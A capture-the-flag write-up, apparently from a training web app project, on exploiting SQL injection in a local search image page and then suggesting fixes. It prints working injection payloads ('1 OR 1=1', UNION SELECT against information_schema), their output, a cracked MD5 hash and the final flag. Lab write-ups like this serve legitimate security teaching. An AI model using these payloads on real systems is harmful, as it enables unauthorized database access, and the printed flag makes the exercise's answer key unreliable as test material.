# Breach Name: SQL Injection on Search Image Page
## Description of the Breach

This breach was identified on the search image page of the website, where an SQL Injection vulnerability allows unauthorized access to the database. By injecting SQL commands into the input field, we were able to retrieve sensitive information, including a flag hidden in the database.

## Steps to Reproduce

1. Navigate to the Search Image Page:
	- From the homepage, go to the search image page:
	```
	http://localhost:8080/?page=searchimg
	```

2. Test for SQL Injection:
	- In the input field, start by testing simple SQL injection commands, such as:
	```
	1 OR 1=1
	```
	This query returns multiple entries, indicating that the input is vulnerable to SQL injection:
	```
	ID: 1 OR 1=1 
	Title: Nsa
	Url : https://fr.wikipedia.org/wiki/Programme_

	ID: 1 OR 1=1 
	Title: 42 !
	Url : https://fr.wikipedia.org/wiki/Fichier:42

	ID: 1 OR 1=1 
	Title: Google
	Url : https://fr.wikipedia.org/wiki/Logo_de_Go

	ID: 1 OR 1=1 
	Title: Earth
	Url : https://en.wikipedia.org/wiki/Earth#/med

	ID: 1 OR 1=1 
	Title: Hack me ?
	Url : borntosec.ddns.net/images.png
	```

3. Enumerate Database Tables:
	- Use SQL injection to enumerate the table names in the database:
	```
	ID: 1 OR 1=1 UNION SELECT table_name, NULL FROM information_schema.tables
	```
	This query lists all the tables in the database.

4. Enumerate Columns in a Specific Table:
	- After identifying the relevant table, enumerate its columns using:
	```
	ID: 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
	```

5. Search for Sensitive Data:
	- While enumerating, you may come across a table and column with a suspicious or interesting name, such as FLAG. After further investigation, you can search for specific data using:
	```
	ID: 1 OR 1=1 UNION SELECT id, comment FROM list_images
	```
	This query reveals:
	```
	Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
	Url : 5
	```

6. Decrypt the MD5 Hash and Convert to SHA-256:
	- The revealed information suggests that you need to decode the provided MD5 hash, then convert it to SHA-256 to get the flag.
	- Use an online tool like DCode to decode the MD5 hash:
	  - MD5 Hash: 1928e8083cf461a51303633093573c46
	  - Decrypted Text: albatroz
	- Convert the decrypted text (albatroz) to SHA-256 using an online tool or a script:
	```
	echo -n "albatroz" | sha256sum
	```
	Flag: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## Explanation of the Breach

The vulnerability here is an SQL Injection flaw on the search image page. The application fails to properly sanitize user input, allowing attackers to execute arbitrary SQL commands. This can lead to unauthorized access to the database, exposing sensitive information, and ultimately revealing hidden data like flags.

## How to Fix the Breach

1. Use Prepared Statements and Parameterized Queries:
	- Ensure that all database queries use prepared statements with parameterized inputs to prevent SQL injection.

2. Input Validation and Sanitization:
	- Validate and sanitize all user inputs, ensuring that only expected data types and values are accepted.

3. Limit Database Permissions:
	- Restrict the database permissions for the application to the minimum necessary. This reduces the potential impact of an SQL injection attack.

4. Monitor and Log Suspicious Activity:
	- Implement logging and monitoring to detect and respond to suspicious database queries, particularly those involving SQL injection attempts.

5. Use Web Application Firewalls (WAF):
	- Deploy a WAF to filter out malicious traffic and protect against common web vulnerabilities like SQL injection.